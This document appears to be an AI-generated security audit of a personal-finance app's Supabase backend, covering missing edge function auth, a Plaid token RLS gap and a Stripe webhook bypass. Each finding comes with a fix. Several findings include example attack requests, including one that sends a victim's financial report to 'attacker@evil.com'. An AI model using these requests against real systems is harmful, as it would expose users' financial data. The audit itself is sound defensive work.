# Arkonomy Security Audit
**Date:** 2026-05-27  
**Auditor:** Claude Code (automated + Supabase MCP)  
**Scope:** RLS policies, API key exposure, Edge Function auth, Stripe webhooks, Plaid token storage

---

## Summary

| Severity | Count | Areas |
|----------|-------|-------|
| 🔴 CRITICAL | 3 | Edge functions with no auth → data exfiltration |
| 🟠 HIGH | 2 | Plaid access_token readable client-side; push-notify unprotected |
| 🟡 MEDIUM | 3 | Stripe webhook bypass; duplicate RLS policies; plaintext password in .env.test |
| 🔵 LOW | 2 | market-data unauthed; anon key used as Bearer fallback |

---

## 1. RLS Policies

**All 7 tables have RLS enabled.** Every policy correctly uses `auth.uid() = user_id` (or `auth.uid() = id` for profiles). No table is readable by unauthenticated users or by other users' sessions.

### Policy inventory

| Table | Ops covered | Expression | Status |
|-------|-------------|------------|--------|
| `transactions` | SELECT / INSERT / UPDATE / DELETE | `auth.uid() = user_id` | ✅ PASS |
| `categories` | SELECT / INSERT / UPDATE / DELETE | `auth.uid() = user_id` | ✅ PASS |
| `savings` | SELECT / INSERT / UPDATE / DELETE | `auth.uid() = user_id` | ✅ PASS |
| `savings_reminders` | ALL (qual + with_check) | `auth.uid() = user_id` | ✅ PASS |
| `profiles` | SELECT / UPDATE | `auth.uid() = id` | ⚠️ WARN (see below) |
| `investments` | ALL + SELECT + INSERT | `auth.uid() = user_id` | ⚠️ WARN (see below) |
| `plaid_items` | ALL + SELECT | `auth.uid() = user_id` | 🟠 HIGH (see below) |

### 1a. plaid_items — HIGH
The `ALL` policy (plus a redundant SELECT policy) lets a user's anon-key session call:
```js
supabase.from('plaid_items').select('access_token')
```
and receive their own Plaid `access_token` directly in the browser. Plaid access tokens are long-lived bank credentials. They must never be readable client-side. The client has no legitimate need to read `access_token` — all Plaid operations go through Edge Functions that use the service role key.

**Fix:** Remove SELECT from the `ALL` policy and add column-level restrictions, or split into INSERT-only RLS and handle all reads server-side only.

### 1b. Duplicate policies — MEDIUM
`profiles` has 2 identical SELECT policies and 2 UPDATE policies. `investments` has a redundant `ALL` + separate SELECT + INSERT. Duplicates don't create a vulnerability today but make future audits harder and risk contradictory policies being added.

**Fix:** Drop the duplicates. Keep one policy per operation per table.

### 1c. profiles — no INSERT policy
Profile creation is triggered server-side (auth.users trigger), so no client INSERT is needed. This is intentional and correct — just noting it for completeness.

---

## 2. API Key Exposure

### 2a. .env.test — MEDIUM
`E2E_EMAIL` and `E2E_PASSWORD` contain a real production account password in plaintext. The file is gitignored and has never been committed. Risk is accidental inclusion in backups, zips, or shared directories.

**Fix:** Create a dedicated read-only E2E test account with no real financial data. Never reuse a production account for automated tests.

### 2b. .env.local — INFO
Contains `SUPABASE_SERVICE_ROLE_KEY`. This file is gitignored and not in git history — correct. No action required, just documenting.

### 2c. src/ — PASS
No hardcoded secrets. All sensitive values are loaded via `import.meta.env.*`. The service role key never appears in `src/`.

### 2d. Git history — PASS
`git log` shows no `.env*` file was ever committed to the repository.

---

## 3. Edge Function Auth

### Functions with proper JWT validation ✅
All of these check `Authorization: Bearer <jwt>`, call `supabase.auth.getUser(token)`, and return 401 on failure:

- `plaid-link-token`, `plaid-exchange-token`, `plaid-get-accounts`
- `plaid-sync-transactions` (user path), `plaid-batch-sync` (service-role-only, enforced)
- `stripe-checkout`, `alpaca-oauth-callback`, `alpaca-invest`, `stock-ai-analysis`

### get-insights — 🔴 CRITICAL
No auth check. Accepts `userId` from the POST body and returns that user's financial insights.

**Attack:** `POST /get-insights` with `{ "userId": "<any valid UUID>" }` — no credentials required. Any attacker who knows (or brute-forces) a valid user UUID can read another user's financial data.

### weekly-report — 🔴 CRITICAL
No auth check. Accepts `userId` and `email` from POST body, fetches that user's transaction history, and emails it to the supplied address.

**Attack:** `POST /weekly-report` with `{ "userId": "<victim UUID>", "email": "attacker@evil.com" }` exfiltrates a full financial report to an attacker-controlled address.

### generate-monthly-report — 🔴 CRITICAL
Same vulnerability as `weekly-report`. No auth check. Unauthenticated POST can exfiltrate any user's monthly transaction data to an arbitrary email.

### push-notify — 🟠 HIGH
No auth check on the batch/cron invocation path. Any unauthenticated caller can trigger a mass push notification send to all users. Unlike `plaid-batch-sync`, the function does not verify the service role key.

### market-data — 🔵 LOW
No auth check. Fetches only public market data (Finnhub, Yahoo Finance). No user data exposed. Risk: unauthenticated callers can abuse the Finnhub API key quota.

---

## 4. Stripe Webhook Signature Validation

**File:** `supabase/functions/stripe-webhook/index.ts`

Signature verification using `stripe.webhooks.constructEventAsync(body, sig, STRIPE_WEBHOOK_SECRET)` is present and correctly implemented **when the secret is set**. However, the code contains an explicit dev-mode bypass:

```ts
// line ~46-48
} catch {
  // dev mode — no secret configured
  event = JSON.parse(body);
}
```

If `STRIPE_WEBHOOK_SECRET` is missing or misconfigured in the production Vercel/Supabase environment, any unauthenticated POST can trigger `checkout.session.completed` (upgrade any account to Pro) or `customer.subscription.deleted` (downgrade accounts).

**Status:** 🟡 MEDIUM — safe only if the secret is guaranteed set in production.

**Fix:** Add a hard guard at the top of the function:
```ts
if (!STRIPE_WEBHOOK_SECRET) {
  return new Response('Webhook secret not configured', { status: 500 });
}
```

---

## 5. Plaid Access Token Storage

**Status:** ✅ PASS (with caveat — see RLS item 1a)

- `plaid-exchange-token`: writes `access_token` to `plaid_items` via service role key only.
- `plaid-sync-transactions`, `plaid-get-accounts`, `plaid-batch-sync`: read `access_token` from `plaid_items` server-side only, never return it to the client.
- No `access_token` appears in `localStorage`, `sessionStorage`, or any client response payload.

The storage mechanism is correct. The RLS gap (item 1a) means a compromised session *could* query the token directly — that's the residual risk.

---

## 6. Miscellaneous

### App.jsx:833 — anon key as Bearer fallback — 🔵 LOW
```js
const token = session?.access_token ?? SUPABASE_KEY
```
The anon key is used as a fallback `Authorization: Bearer` header to `push-notify` when no session exists. The anon key is a publishable credential (not a secret), but it's semantically wrong — it's not a user JWT and shouldn't be treated as one. Since `push-notify` has no auth enforcement, this doesn't escalate privilege, but it's confusing and will fail if `push-notify` ever gains auth checking.

---

## Prioritised Fix List

| Priority | Finding | File |
|----------|---------|------|
| 🔴 1 | Add JWT auth to `get-insights` | `supabase/functions/get-insights/index.ts` |
| 🔴 2 | Add JWT auth to `weekly-report` | `supabase/functions/weekly-report/index.ts` |
| 🔴 3 | Add JWT auth to `generate-monthly-report` | `supabase/functions/generate-monthly-report/index.ts` |
| 🟠 4 | Add service-role-key guard to `push-notify` batch path | `supabase/functions/push-notify/index.ts` |
| 🟠 5 | Remove client SELECT access to `plaid_items.access_token` | Supabase dashboard → RLS |
| 🟡 6 | Add hard fail in stripe-webhook if secret unset | `supabase/functions/stripe-webhook/index.ts` |
| 🟡 7 | Drop duplicate RLS policies on profiles, investments, plaid_items | Supabase dashboard → RLS |
| 🟡 8 | Replace .env.test production credentials with a dedicated test account | `.env.test` |
| 🔵 9 | Add auth to `market-data` or rate-limit it | `supabase/functions/market-data/index.ts` |
| 🔵 10 | Fix anon-key-as-Bearer fallback in App.jsx | `src/App.jsx:833` |
